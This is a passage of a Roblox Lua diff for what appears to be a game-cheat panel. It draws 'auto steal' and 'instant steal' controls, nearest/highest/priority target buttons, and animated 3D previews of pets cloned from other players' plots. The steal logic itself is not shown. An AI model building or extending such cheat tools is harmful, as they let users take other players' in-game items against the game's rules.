+    titleLabel.TextColor3 = Theme.TextPrimary; titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+    local ITEM_H, ITEM_PAD, VISIBLE_ROWS = 31, 4, 10
+    local LIST_H = ITEM_H * VISIBLE_ROWS + ITEM_PAD * (VISIBLE_ROWS - 1)
+    local listFrame = Instance.new("ScrollingFrame", frame)
+    listFrame.Size = UDim2.new(1,-12,1,-20); listFrame.Position = UDim2.new(0,6,0,14)
+    listFrame.BackgroundTransparency = 1; listFrame.BorderSizePixel = 0
+    listFrame.ScrollingDirection = Enum.ScrollingDirection.Y
+    listFrame.ScrollBarThickness = 0
+    listFrame.ScrollBarImageColor3 = Theme.Accent1
+    local uiListLayout = Instance.new("UIListLayout", listFrame)
+    uiListLayout.Padding = UDim.new(0,ITEM_PAD); uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+    -- Progress visual is optional (UI removed from panel).
+    local progressBarFill = nil
+
+    local function resetProgressVisual()
+        if progressBarFill then
+            progressBarFill.Size = UDim2.new(0, 0, 1, 0)
+            progressBarFill.BackgroundTransparency = 0
+        end
+    end
+
+    local function setProgressVisualFull()
+        if progressBarFill then
+            progressBarFill.Size = UDim2.new(1, 0, 1, 0)
+            progressBarFill.BackgroundTransparency = 0
+        end
+    end
+
+    local function runProgressTimer()
+        if progressBarFill then
+            activeProgressTween = TweenService:Create(
+                progressBarFill,
+                TweenInfo.new(STEAL_DURATION, Enum.EasingStyle.Linear),
+                {Size = UDim2.new(1, 0, 1, 0)}
+            )
+            activeProgressTween:Play()
+            activeProgressTween.Completed:Wait()
+        else
+            task.wait(STEAL_DURATION)
+        end
+    end
+
+    local toggleBtnContainer = Instance.new("Frame", frame)
+    toggleBtnContainer.Size = UDim2.new(1,-30,0,144); toggleBtnContainer.Position = UDim2.new(0,15,1,-154)
+    toggleBtnContainer.BackgroundTransparency = 1
+    toggleBtnContainer.Visible = false
+    
+    local enableBtn = Instance.new("TextButton", toggleBtnContainer)
+    local uiScale = 1
+    enableBtn.Size = UDim2.new(1,0,0,32*uiScale); enableBtn.BackgroundColor3 = Theme.Success
+    enableBtn.Text = "ENABLED"; enableBtn.Font = Enum.Font.GothamBold
+    enableBtn.TextSize = 13*uiScale; enableBtn.TextColor3 = Theme.TextPrimary
+    Instance.new("UICorner", enableBtn).CornerRadius = UDim.new(0, 8)
+    
+    local nearestBtn = Instance.new("TextButton", toggleBtnContainer)
+    nearestBtn.Size = UDim2.new(0.48,0,0,28*uiScale); nearestBtn.Position = UDim2.new(0,0,0,36*uiScale)
+    nearestBtn.BackgroundColor3 = Theme.SurfaceHighlight
+    nearestBtn.Text = "NEAREST"; nearestBtn.Font = Enum.Font.GothamBold
+    nearestBtn.TextSize = 11*uiScale; nearestBtn.TextColor3 = Theme.TextPrimary
+    Instance.new("UICorner", nearestBtn).CornerRadius = UDim.new(0, 6)
+
+    local highestBtn = Instance.new("TextButton", toggleBtnContainer)
+    highestBtn.Size = UDim2.new(0.48,0,0,28*uiScale); highestBtn.Position = UDim2.new(0.52,0,0,36*uiScale)
+    highestBtn.BackgroundColor3 = Theme.SurfaceHighlight
+    highestBtn.Text = "HIGHEST"; highestBtn.Font = Enum.Font.GothamBold
+    highestBtn.TextSize = 11*uiScale; highestBtn.TextColor3 = Theme.TextPrimary
+    Instance.new("UICorner", highestBtn).CornerRadius = UDim.new(0, 6)
+
+    local priorityBtn = Instance.new("TextButton", toggleBtnContainer)
+    priorityBtn.Size = UDim2.new(1,0,0,24*uiScale); priorityBtn.Position = UDim2.new(0,0,0,68*uiScale)
+    priorityBtn.BackgroundColor3 = Theme.SurfaceHighlight
+    priorityBtn.Text = "PRIORITY"; priorityBtn.Font = Enum.Font.GothamBold
+    priorityBtn.TextSize = 11*uiScale; priorityBtn.TextColor3 = Theme.TextPrimary
+    Instance.new("UICorner", priorityBtn).CornerRadius = UDim.new(0, 6)
+
+    local function attachPet3DPreview(parentBtn, petData, layoutOpts)
+        layoutOpts = layoutOpts or {}
+        local holder = Instance.new("Frame", parentBtn)
+        holder.Size = layoutOpts.Size or UDim2.new(0, 20, 0, 20)
+        holder.Position = layoutOpts.Position or UDim2.new(0, 34, 0.5, -10)
+        holder.BackgroundColor3 = Theme.SurfaceHighlight
+        holder.BackgroundTransparency = 0.05
+        holder.BorderSizePixel = 0
+        Instance.new("UICorner", holder).CornerRadius = UDim.new(0, layoutOpts.CornerRadius or 5)
+        local hs = Instance.new("UIStroke", holder)
+        hs.Color = Theme.Accent1
+        hs.Thickness = 1
+        hs.Transparency = 0.45
+
+        local vp = Instance.new("ViewportFrame", holder)
+        vp.Size = UDim2.new(1, 0, 1, 0)
+        vp.Position = UDim2.new(0, 0, 0, 0)
+        vp.BackgroundTransparency = 1
+        vp.BorderSizePixel = 0
+        vp.Ambient = Color3.fromRGB(245, 245, 245)
+        vp.LightColor = Color3.new(1, 1, 1)
+        vp.LightDirection = Vector3.new(-0.45, -0.9, -0.35)
+        vp.ImageTransparency = 0
+
+        local failLbl = Instance.new("TextLabel", holder)
+        failLbl.Size = UDim2.new(1, 0, 1, 0)
+        failLbl.BackgroundTransparency = 1
+        failLbl.Text = "3D"
+        failLbl.Font = Enum.Font.GothamBlack
+        failLbl.TextSize = 9
+        failLbl.TextColor3 = Theme.TextSecondary
+        failLbl.Visible = true
+
+        local ad = petData and petData.animalData
+        local srcModel, srcPart = nil, nil
+        local petNameNorm = (petData and petData.petName and tostring(petData.petName):lower()) or ""
+        local slotNorm = ad and ad.slot and tostring(ad.slot) or ""
+        local forceLiveModelOnly = (petData and petData.ForceLiveModelOnly == true) or (layoutOpts and layoutOpts.ForceLiveModelOnly == true)
+        local preferFallbackModelOnly = (petData and petData.ForceFallbackModel == true) or (layoutOpts and layoutOpts.ForceFallbackModel == true)
+        local forceEmbeddedAnimation = (petData and petData.ForceEmbeddedAnimation == true) or (layoutOpts and layoutOpts.ForceEmbeddedAnimation == true)
+
+        local function getAnimatorFrom(obj)
+            if not obj then return nil end
+            local hum = obj:FindFirstChildOfClass("Humanoid")
+            if hum then
+                return hum:FindFirstChildOfClass("Animator") or hum:FindFirstChildWhichIsA("Animator", true)
+            end
+            local ac = obj:FindFirstChildOfClass("AnimationController")
+            if ac then
+                return ac:FindFirstChildOfClass("Animator") or ac:FindFirstChildWhichIsA("Animator", true)
+            end
+            return obj:FindFirstChildWhichIsA("Animator", true)
+        end
+        local function ensureAnimatorForPreviewModel(model)
+            if not model or not model:IsA("Model") then return nil end
+            local animator = getAnimatorFrom(model)
+            if animator then return animator end
+            local ac = model:FindFirstChildOfClass("AnimationController")
+            if not ac then
+                ac = Instance.new("AnimationController")
+                ac.Name = "PreviewAnimationController"
+                ac.Parent = model
+            end
+            animator = ac:FindFirstChildOfClass("Animator")
+            if not animator then
+                animator = Instance.new("Animator")
+                animator.Parent = ac
+            end
+            return animator
+        end
+
+        local function playEmbeddedPreviewAnimations(model)
+            local animator = getAnimatorFrom(model)
+            -- Se não tiver animator, tenta criar via ensureAnimatorForPreviewModel
+            if not animator then animator = ensureAnimatorForPreviewModel(model) end
+            if not animator then return false end
+            local any = false
+            -- Coleta animações únicas (evita duplicatas)
+            local seen = {}
+            for _, d in ipairs(model:GetDescendants()) do
+                if d:IsA("Animation") and d.AnimationId ~= "" and not seen[d.AnimationId] then
+                    seen[d.AnimationId] = true
+                    local okLoad, track = pcall(function() return animator:LoadAnimation(d) end)
+                    if okLoad and track then
+                        pcall(function() track.Looped = true end)
+                        pcall(function() track:Play(0.15, 1, 1) end)
+                        any = true
+                    end
+                end
+            end
+            return any
+        end
+
+        local function buildPetPreviewCacheKey()
+            if petData and type(petData.previewCacheKey) == "string" and petData.previewCacheKey ~= "" then
+                return petData.previewCacheKey
+            end
+            if petData and type(petData.uid) == "string" and petData.uid ~= "" then
+                return petData.uid
+            end
+            if ad and ad.plot and ad.slot then
+                return tostring(ad.plot) .. "|" .. tostring(ad.slot)
+            end
+            if petNameNorm ~= "" then
+                return petNameNorm
+            end
+            return ""
+        end
+        local cacheKey = buildPetPreviewCacheKey()
+
+        local function getAnimalsTemplateFolder()
+            local root = ReplicatedStorage:FindFirstChild("Models")
+            return root and root:FindFirstChild("Animals")
+        end
+        local function findAnimalModelInFolder(folder, nameKey)
+            if not folder or not nameKey or nameKey == "" then return nil end
+            local key = tostring(nameKey)
+            local inst = folder:FindFirstChild(key)
+            if inst and inst:IsA("Model") then return inst end
+            local kl = key:lower()
+            for _, ch in ipairs(folder:GetChildren()) do
+                if ch:IsA("Model") and ch.Name:lower() == kl then
+                    return ch
+                end
+            end
+            return nil
+        end
+        local function resolveTemplateModelFromStorage()
+            local folder = getAnimalsTemplateFolder()
+            if not folder then return nil end
+            local order = {}
+            local function push(v)
+                if v == nil or v == "" then return end
+                local s = tostring(v)
+                for _, ex in ipairs(order) do
+                    if ex == s then return end
+                end
+                table.insert(order, s)
+            end
+            if ad then
+                push(ad.Index)
+                push(ad.index)
+            end
+            if petData and petData.petName then
+                push(petData.petName)
+                -- Tenta normalizar DisplayName → chave do RS (remove espaços)
+                local norm = tostring(petData.petName):gsub("%s+", "")
+                push(norm)
+            end
+            for _, key in ipairs(order) do
+                local m = findAnimalModelInFolder(folder, key)
+                if m then return m end
+            end
+            -- Busca fuzzy: procura modelo cujo nome contém o petName
+            if petData and petData.petName and petData.petName ~= "" then
+                local pnl = tostring(petData.petName):lower():gsub("%s+", "")
+                for _, ch in ipairs(folder:GetChildren()) do
+                    if ch:IsA("Model") then
+                        local nl = ch.Name:lower()
+                        if nl == pnl or nl:find(pnl, 1, true) or pnl:find(nl, 1, true) then
+                            return ch
+                        end
+                    end
+                end
+            end
+            return nil
+        end
+        local function findModelByPetNameInPlot(plot, animalData, petNameLower)
+            if not plot then return nil end
+            local wanted = {}
+            local function addWanted(v)
+                if v == nil or v == "" then return end
+                wanted[tostring(v):lower()] = true
+            end
+            if animalData then
+                addWanted(animalData.Index)
+                addWanted(animalData.index)
+            end
+            addWanted(petNameLower)
+
+            local exact = nil
+            for _, d in ipairs(plot:GetDescendants()) do
+                if d:IsA("Model") and d ~= plot and d.Name ~= "Base" then
+                    local nl = d.Name:lower()
+                    if wanted[nl] then
+                        exact = d
+                        break
+                    end
+                end
+            end
+            return exact
+        end
+
+        local templateModel = resolveTemplateModelFromStorage()
+
+        local previewObj = nil
+        local previewFromCache = false
+        local previewFromLiveModel = false
+        if not forceLiveModelOnly then
+            if templateModel and templateModel.Archivable then
+                local ok, cloned = pcall(function() return templateModel:Clone() end)
+                if ok then previewObj = cloned end
+            end
+            if not previewObj and cacheKey ~= "" then
+                local tmpl = SharedState.PetPreviewModelCache[cacheKey]
+                if tmpl and tmpl.Parent == nil and tmpl.Archivable then
+                    local ok, cloned = pcall(function() return tmpl:Clone() end)
+                    if ok and cloned then
+                        previewObj = cloned
+                        previewFromCache = true
+                    end
+                end
+            end
+        end
+
+        do
+            local plot = ad and ad.plot and Workspace:FindFirstChild("Plots") and Workspace.Plots:FindFirstChild(ad.plot)
+            local podiums = plot and plot:FindFirstChild("AnimalPodiums")
+            local podium = podiums and ad.slot and podiums:FindFirstChild(tostring(ad.slot))
+            if plot then
+                srcModel = findModelByPetNameInPlot(plot, ad, petNameNorm)
+                local base = podium and podium:FindFirstChild("Base")
+                local spawnPart = base and (base:FindFirstChild("Spawn") or base:FindFirstChildWhichIsA("BasePart"))
+
+                if not srcModel then
+                    if forceLiveModelOnly then
+                        local targetPart = findAdorneeGlobal(ad)
+                        if targetPart and targetPart:IsA("BasePart") then
+                            srcPart = targetPart
+                        elseif spawnPart then
+                            srcPart = spawnPart
+                        end
+                    else
+
+                        local bestModel, bestScore = nil, -math.huge
+                        for _, d in ipairs(plot:GetDescendants()) do
+                            if d:IsA("Model") and d ~= plot and d.Name ~= "Base" then
+                                local pp = d.PrimaryPart or d:FindFirstChildWhichIsA("BasePart")
+                                if pp then
+                                    local nameL = d.Name:lower()
+                                    local score = 0
+                                    if petNameNorm ~= "" and (nameL:find(petNameNorm, 1, true) or petNameNorm:find(nameL, 1, true)) then
+                                        score = score + 200
+                                    end
+                                    if slotNorm ~= "" and nameL:find(slotNorm, 1, true) then
+                                        score = score + 100
+                                    end
+                                    if nameL:find("podium", 1, true) or nameL:find("base", 1, true) then
+                                        score = score - 120
+                                    end
+                                    if spawnPart then
+                                        local dist = (pp.Position - spawnPart.Position).Magnitude
+                                        score = score - dist
+                                    end
+                                    if score > bestScore then
+                                        bestScore = score
+                                        bestModel = d
+                                    end
+                                end
+                            end
+                        end
+
+                        srcModel = bestModel
+                        if not srcModel and spawnPart then
+                            srcPart = spawnPart
+                        end
+                    end
+                end
+            end
+        end
+
+        if (not srcModel) and (not forceLiveModelOnly) and petNameNorm ~= "" then
+            local plots = Workspace:FindFirstChild("Plots")
+            if plots then
+                local bestModel, bestScore = nil, -math.huge
+                for _, plot in ipairs(plots:GetChildren()) do
+                    for _, d in ipairs(plot:GetDescendants()) do
+                        if d:IsA("Model") and d ~= plot and d.Name ~= "Base" then
+                            local pp = d.PrimaryPart or d:FindFirstChildWhichIsA("BasePart")
+                            if pp then
+                                local nameL = d.Name:lower()
+                                if nameL:find("podium", 1, true) or nameL:find("base", 1, true) or nameL:find("plotsign", 1, true) then
+                                    continue
+                                end
+                                local score = 0
+                                if nameL == petNameNorm then
+                                    score = score + 320
+                                elseif nameL:find(petNameNorm, 1, true) or petNameNorm:find(nameL, 1, true) then
+                                    score = score + 220
+                                end
+                                if slotNorm ~= "" and nameL:find(slotNorm, 1, true) then
+                                    score = score + 60
+                                end
+                                if score > bestScore then
+                                    bestScore = score
+                                    bestModel = d
+                                end
+                            end
+                        end
+                    end
+                end
+                if bestModel then
+                    srcModel = bestModel
+                end
+            end
+        end
+
+        -- srcModel é apenas o driver de animação (não substitui previewObj)
+        -- Se não tiver templateModel (RS), usa live model como fallback visual
+        if not previewObj then
+            if srcModel and srcModel.Archivable then
+                local ok, clonedLive = pcall(function() return srcModel:Clone() end)
+                if ok and clonedLive then
+                    previewObj = clonedLive
+                    previewFromCache = false
+                    previewFromLiveModel = true
+                end
+            elseif srcPart and srcPart.Archivable then
+                local ok, clonedPart = pcall(function() return srcPart:Clone() end)
+                if ok and clonedPart then
+                    previewObj = clonedPart
+                    previewFromCache = false
+                end
+            end
+        end
+
+        if not previewObj then return holder end
+
+        failLbl.Visible = false
+
+        -- WorldModel é necessário para AnimationController + Bone funcionarem no ViewportFrame
+        local worldModel = Instance.new("WorldModel", vp)
+        previewObj.Parent = worldModel
+
+        for _, d in ipairs(previewObj:GetDescendants()) do
+            if d:IsA("BasePart") then
+                d.Massless = true
+                d.CanCollide = false
+                -- Para RS template: partes desancoradas para o WorldModel mover via animação
+                -- Para live model como visual: ancoramos e copiamos CFrame
+                if previewFromLiveModel then
+                    d.Anchored = true
+                else
+                    d.Anchored = false
+                end
+            end
+        end
+
+        -- Posicionar o modelo no origin do WorldModel para a câmera enquadrar corretamente
+        if not previewFromLiveModel and previewObj:IsA("Model") then
+            pcall(function()
+                local cf, sz = previewObj:GetBoundingBox()
+                if cf then
+                    local offset = cf.Position
+                    previewObj:PivotTo(CFrame.new(-offset.X, -offset.Y, -offset.Z) * cf.Rotation)
+                end
+            end)
+        end
+
+        -- Detectar tipo de rig
+        local hasAnimController = previewObj:IsA("Model") and previewObj:FindFirstChildOfClass("AnimationController") ~= nil
+        local hasMotor6D = false
+        if previewObj:IsA("Model") then
+            for _, d in ipairs(previewObj:GetDescendants()) do
+                if d:IsA("Motor6D") then hasMotor6D = true; break end
+            end
+        end
+        local isBoneBased = hasAnimController and not hasMotor6D
+
+        -- Busca animador vivo em qualquer plot pelo petName (para pegar IDs das tracks)
+        local function findLiveAnimatorByName()
+            local plots = Workspace:FindFirstChild("Plots")
+            if not plots or petNameNorm == "" then return nil end
+            for _, plot in ipairs(plots:GetChildren()) do
+                for _, d in ipairs(plot:GetDescendants()) do
+                    if d:IsA("Model") then
+                        local nl = d.Name:lower()
+                        if nl == petNameNorm
+                            or nl:find(petNameNorm, 1, true)
+                            or (petNameNorm ~= "" and petNameNorm:find(nl, 1, true)) then
+                            local a = getAnimatorFrom(d)
+                            if a and #a:GetPlayingAnimationTracks() > 0 then
+                                return a
+                            end
+                        end
+                    end
+                end
+            end
+            return nil
+        end
+
+        local embeddedAnimPlaying = false
+        if previewObj:IsA("Model") then
+            if forceEmbeddedAnimation then
+                embeddedAnimPlaying = playEmbeddedPreviewAnimations(previewObj)
+            elseif isBoneBased then
+                -- Bone-based: RS template não tem Animation objects embutidos.
+                -- Busca o animador vivo e usa os IDs das tracks dele.
+                local liveAnim = (srcModel and getAnimatorFrom(srcModel)) or findLiveAnimatorByName()
+                if liveAnim then
+                    local dstAnim = ensureAnimatorForPreviewModel(previewObj) or getAnimatorFrom(previewObj)
+                    if dstAnim then
+                        local dstTracksById = {}
+                        -- Carregar imediatamente as tracks que estão tocando
+                        task.defer(function()
+                            if not holder.Parent then return end
+                            local srcTracks = liveAnim:GetPlayingAnimationTracks()
+                            for _, st in ipairs(srcTracks) do
+                                local anim = st.Animation
+                                local animId = anim and anim.AnimationId
+                                if animId and animId ~= "" and not dstTracksById[animId] then
+                                    local okL, track = pcall(function() return dstAnim:LoadAnimation(anim) end)
+                                    if okL and track then
+                                        dstTracksById[animId] = track
+                                        pcall(function() track.Looped = true; track:Play(0, 1, 1) end)
+                                    end
+                                end
+                            end
+                        end)
+                        -- Manter sincronizado quando tracks mudam
+                        animSyncConn = RunService.Heartbeat:Connect(function()
+                            if not holder.Parent then
+                                if animSyncConn then animSyncConn:Disconnect() end
+                                return
+                            end
+                            local srcTracks = liveAnim:GetPlayingAnimationTracks()
+                            local activeIds = {}
+                            for _, st in ipairs(srcTracks) do
+                                local anim = st.Animation
+                                local animId = anim and anim.AnimationId
+                                if animId and animId ~= "" then
+                                    activeIds[animId] = true
+                                    if not dstTracksById[animId] then
+                                        local okL, track = pcall(function() return dstAnim:LoadAnimation(anim) end)
+                                        if okL and track then
+                                            dstTracksById[animId] = track
+                                            pcall(function() track.Looped = true; track:Play(0, 1, 1) end)
+                                        end
+                                    end
+                                end
+                            end
+                            for animId, track in pairs(dstTracksById) do
+                                if not activeIds[animId] then
+                                    pcall(function() track:Stop(0.2) end)
+                                    dstTracksById[animId] = nil
+                                end
+                            end
+                            refreshPreviewCamera()
+                        end)
+                        embeddedAnimPlaying = true
+                    end
+                else
+                    -- Sem live model: tenta embedded como último recurso
+                    embeddedAnimPlaying = playEmbeddedPreviewAnimations(previewObj)
+                end
+            elseif not srcModel then
+                embeddedAnimPlaying = playEmbeddedPreviewAnimations(previewObj)
+            end
+        end
+
+        if not previewFromCache and cacheKey ~= "" and previewObj:IsA("Model") and previewObj.Archivable then
+            pcall(function()
+                local old = SharedState.PetPreviewModelCache[cacheKey]
+                local tmpl = previewObj:Clone()
+                tmpl.Parent = nil
+                SharedState.PetPreviewModelCache[cacheKey] = tmpl
+                if old and old ~= tmpl and old.Parent == nil then
+                    pcall(function() old:Destroy() end)
+                end
+            end)
+        end
+
+        local function relPath(obj, root)
+            local parts = {}
+            local cur = obj
+            while cur and cur ~= root do
+                table.insert(parts, 1, cur.Name)
+                cur = cur.Parent
+            end
+            return table.concat(parts, "/")
+        end
+
+        local syncConn = nil
+        local animSyncConn = nil
+        local cam = nil
+        local function refreshPreviewCamera()
+            if not cam or not previewObj or not previewObj.Parent then return end
+            local center, size
+            if previewObj:IsA("Model") then
+                local ok, cf, sz = pcall(function() return previewObj:GetBoundingBox() end)
+                if ok then
+                    center = cf.Position
+                    size = sz
+                else
+                    local okPivot, piv = pcall(function() return previewObj:GetPivot() end)
+                    local okSize, ext = pcall(function() return previewObj:GetExtentsSize() end)
+                    if okPivot then center = piv.Position end
+                    if okSize then size = ext end
+                end
+            elseif previewObj:IsA("BasePart") then
+                center = previewObj.Position
+                size = previewObj.Size
+            end
+            if not center or not size then return end
+            local maxDim = math.max(size.X, size.Y, size.Z)
+            local halfFov = math.rad(cam.FieldOfView * 0.5)
+            local fitDist = (maxDim * 0.62) / math.tan(halfFov)
+            local dist = math.max(fitDist, maxDim * 1.15)
+            local lookAt = center
+            local camPos = lookAt + Vector3.new(dist * 0.58, maxDim * 0.08, dist * 0.58)
+            cam.CFrame = CFrame.new(camPos, lookAt)
+        end
+
+        if srcModel and previewObj:IsA("Model") then
+            local srcPartMap, srcBoneMap, srcMotorMap = {}, {}, {}
+            local srcPartByName, srcBoneByName, srcMotorByName = {}, {}, {}
+            for _, d in ipairs(srcModel:GetDescendants()) do
+                if d:IsA("BasePart") then
+                    srcPartMap[relPath(d, srcModel)] = d
+                    srcPartByName[d.Name] = srcPartByName[d.Name] or d
+                elseif d:IsA("Bone") then
+                    srcBoneMap[relPath(d, srcModel)] = d
+                    srcBoneByName[d.Name] = srcBoneByName[d.Name] or d
+                elseif d:IsA("Motor6D") then
+                    srcMotorMap[relPath(d, srcModel)] = d
+                    srcMotorByName[d.Name] = srcMotorByName[d.Name] or d
+                end
+            end
+
+            local partPairs, bonePairs, motorPairs = {}, {}, {}
+            for _, d in ipairs(previewObj:GetDescendants()) do
+                if d:IsA("BasePart") then
+                    local src = srcPartMap[relPath(d, previewObj)] or srcPartByName[d.Name]
+                    if src then
+                        table.insert(partPairs, {src = src, dst = d})
+                    end
+                elseif d:IsA("Bone") then
+                    local src = srcBoneMap[relPath(d, previewObj)] or srcBoneByName[d.Name]
+                    if src then
+                        table.insert(bonePairs, {src = src, dst = d})
+                    end
+                elseif d:IsA("Motor6D") then
+                    local src = srcMotorMap[relPath(d, previewObj)] or srcMotorByName[d.Name]
+                    if src then
+                        table.insert(motorPairs, {src = src, dst = d})
+                    end
+                end
+            end
+
+            if not preferFallbackModelOnly then
+                syncConn = RunService.RenderStepped:Connect(function()
+                    if not holder.Parent or not srcModel.Parent then
+                        if syncConn then syncConn:Disconnect() end
+                        return
+                    end
+                    -- Quando usando RS template (previewFromLiveModel=false),
+                    -- NÃO copiar CFrame mundial (jogaria as partes para as coords do jogo).
+                    -- Apenas Motor6D.Transform e Bone.Transform (rotações relativas).
+                    if previewFromLiveModel then
+                        for _, p in ipairs(partPairs) do
+                            if p.src.Parent and p.dst.Parent then
+                                p.dst.CFrame = p.src.CFrame
+                            end
+                        end
+                    end
+                    for _, b in ipairs(bonePairs) do
+                        if b.src.Parent and b.dst.Parent then
+                            b.dst.Transform = b.src.Transform
+                        end
+                    end
+                    for _, m in ipairs(motorPairs) do
+                        if m.src.Parent and m.dst.Parent then
+                            m.dst.Transform = m.src.Transform
+                            -- C0/C1 só quando live model é o visual (mesmo rig)
+                            if previewFromLiveModel then
+                                m.dst.C0 = m.src.C0
+                                m.dst.C1 = m.src.C1
+                            end
+                        end
+                    end
+                    refreshPreviewCamera()
+                end)
+            end
+
+            local srcAnimator = getAnimatorFrom(srcModel)
+            local dstAnimator = ensureAnimatorForPreviewModel(previewObj) or getAnimatorFrom(previewObj)
+            -- Não sobrescrever animSyncConn já definido para bone-based
+            if srcAnimator and dstAnimator and not animSyncConn then
+                local dstTracksById = {}
+                animSyncConn = RunService.Heartbeat:Connect(function()
+                    if not holder.Parent or not srcAnimator.Parent or not dstAnimator.Parent then
+                        if animSyncConn then animSyncConn:Disconnect() end
+                        return
+                    end
+
+                    local srcTracks = srcAnimator:GetPlayingAnimationTracks()
+                    local activeIds = {}
+                    for _, st in ipairs(srcTracks) do
+                        local anim = st.Animation
+                        local animId = anim and anim.AnimationId
+                        if animId and animId ~= "" then
+                            activeIds[animId] = true
+                            local dt = dstTracksById[animId]
+                            if (not dt) or (not dt.IsPlaying) then
+                                local okLoad, loaded = pcall(function() return dstAnimator:LoadAnimation(anim) end)
+                                if okLoad and loaded then
+                                    dstTracksById[animId] = loaded
+                                    dt = loaded
+                                    pcall(function() dt:Play(0.1, st.WeightCurrent, math.max(st.Speed, 0.01)) end)
+                                end
+                            end
+                            if dt then
+                                pcall(function()
+                                    dt:AdjustSpeed(math.max(st.Speed, 0.01))
+                                    dt.TimePosition = st.TimePosition
+                                end)
+                            end
+                        end
+                    end
+
+                    for animId, dt in pairs(dstTracksById) do
+                        if not activeIds[animId] then
+                            pcall(function() dt:Stop(0.1) end)
+                            dstTracksById[animId] = nil
+                        end
+                    end
+                    refreshPreviewCamera()
+                end)
+            end
+        elseif embeddedAnimPlaying and not animSyncConn then
+            animSyncConn = RunService.RenderStepped:Connect(function()
+                if not holder.Parent or not previewObj.Parent then
+                    if animSyncConn then animSyncConn:Disconnect() end
+                    return
+                end
+                refreshPreviewCamera()
+            end)
+        elseif srcPart and previewObj:IsA("BasePart") then
+            syncConn = RunService.RenderStepped:Connect(function()
+                if not holder.Parent or not srcPart.Parent or not previewObj.Parent then
+                    if syncConn then syncConn:Disconnect() end
+                    return
+                end
+                previewObj.CFrame = srcPart.CFrame
+                refreshPreviewCamera()
+            end)
+        end
+        holder.Destroying:Connect(function()
+            if syncConn then syncConn:Disconnect() end
+            if animSyncConn then animSyncConn:Disconnect() end
+        end)
+
+        cam = Instance.new("Camera")
+        cam.Parent = vp
+        vp.CurrentCamera = cam
+        cam.FieldOfView = layoutOpts.Fov or 28
+
+        refreshPreviewCamera()
+        return holder
+    end
+
+    _G.XiAttachPet3DPreview = attachPet3DPreview
+
+    local function updateUI(enabled, allPets)
+        autoStealEnabled = true
+        instantStealEnabled = true -- Force always ON (lefa9)
+        enableBtn.Text = "ENABLED"
+        enableBtn.BackgroundColor3 = Theme.Success
+
+        listFrame.ScrollBarThickness = 0
+        listFrame.ScrollingEnabled = true
+
+        -- Keep list in sync when target pool changes without explicit redraw flag.
+        if allPets then
+            local needsSync = (#petButtons ~= #allPets)
+            if not needsSync then
+                for i = 1, #allPets do
+                    local pb = petButtons[i]
+                    local currentUid = pb and pb.uid
+                    if currentUid ~= allPets[i].uid then
+                        needsSync = true
+                        break
+                    end
+                end
+            end
+            if needsSync then
+                SharedState.ListNeedsRedraw = true
+            end
+        end
+        
+        nearestBtn.BackgroundColor3 = stealNearestEnabled and Theme.Accent1 or Theme.SurfaceHighlight
+        nearestBtn.TextColor3 = stealNearestEnabled and Color3.new(0,0,0) or Theme.TextPrimary
+
+        highestBtn.BackgroundColor3 = stealHighestEnabled and Theme.Accent1 or Theme.SurfaceHighlight
+        highestBtn.TextColor3 = stealHighestEnabled and Color3.new(0,0,0) or Theme.TextPrimary
+
+        priorityBtn.BackgroundColor3 = stealPriorityEnabled and Theme.Accent1 or Theme.SurfaceHighlight
+        priorityBtn.TextColor3 = stealPriorityEnabled and Color3.new(0,0,0) or Theme.TextPrimary
+
+        if instantStealBtn then
+            instantStealBtn.Text = instantStealEnabled and "INSTANT STEAL: ON" or "INSTANT STEAL: OFF"
+            instantStealBtn.BackgroundColor3 = instantStealEnabled and Theme.Accent1 or Theme.SurfaceHighlight
+            instantStealBtn.TextColor3 = instantStealEnabled and Color3.new(0,0,0) or Theme.TextPrimary
+        end
+
+        if selectedTargetUID and allPets then
+            local found = false
+            for i, p in ipairs(allPets) do
+                if p.uid == selectedTargetUID then
+                    selectedTargetIndex = i
+                    found = true
+                    break
+                end
+            end
+        end
+
+        if SharedState.ListNeedsRedraw then
+            for _, c in ipairs(listFrame:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end
+            petButtons = {}
+            if allPets and #allPets > 0 then
+                for i = 1, #allPets do
+                    local petData = allPets[i]
+                    local btn = Instance.new("TextButton")
+                    btn.Size = UDim2.new(1,0,0,31); btn.BackgroundTransparency = 1
+                    btn.Text = ""; btn.Parent = listFrame
+                    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,6)
+
+                    local cardBg = Instance.new("Frame", btn)
+                    cardBg.Size = UDim2.new(1, -2, 1, -2)
+                    cardBg.Position = UDim2.new(0, 1, 0, 1)
+                    cardBg.BackgroundColor3 = Theme.Surface
+                    cardBg.BackgroundTransparency = 0.04
+                    cardBg.BorderSizePixel = 0
+                    cardBg.ZIndex = 1
+                    Instance.new("UICorner", cardBg).CornerRadius = UDim.new(0, 6)
+
+                    local bStroke = Instance.new("UIStroke", cardBg)
+                    bStroke.Color = Theme.Accent2; bStroke.Thickness = 1; bStroke.Transparency = 0.55
+
+                    local rankChip = Instance.new("Frame", btn)
+                    rankChip.Size = UDim2.new(0,18,0,18); rankChip.Position = UDim2.new(0,10,0.5,-9)
+                    rankChip.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
+                    rankChip.BorderSizePixel = 0
+                    Instance.new("UICorner", rankChip).CornerRadius = UDim.new(0, 5)
+                    local rankLabel = Instance.new("TextLabel", rankChip)
+                    rankLabel.Size = UDim2.new(1,0,1,0)
+                    rankLabel.BackgroundTransparency = 1; rankLabel.Text = tostring(i)
+                    rankLabel.Font = Enum.Font.GothamBlack; rankLabel.TextSize = 9
+                    attachPet3DPreview(btn, petData, {
+                        ForceLiveModelOnly = true,
+                        ForceFallbackModel = false,
+                        ForceEmbeddedAnimation = false,
+                    })
+                    local infoLabel = Instance.new("TextLabel", btn)
+                    infoLabel.Size = UDim2.new(1,-124,1,0); infoLabel.Position = UDim2.new(0,58,0,0)
+                    infoLabel.BackgroundTransparency = 1; infoLabel.RichText = true
+                    infoLabel.Text = formatMutationText(petData.mutation).."<font weight='700'>"..(petData.petName or "No target").."</font>"
+                    infoLabel.Font = Enum.Font.GothamBold; infoLabel.TextSize = 11
+                    infoLabel.TextXAlignment = Enum.TextXAlignment.Left; infoLabel.TextTruncate = Enum.TextTruncate.AtEnd
+                    local mpsLabel = Instance.new("TextLabel", btn)
+                    mpsLabel.Size = UDim2.new(0,66,1,0); mpsLabel.Position = UDim2.new(1,-72,0,0)
+                    mpsLabel.BackgroundTransparency = 1
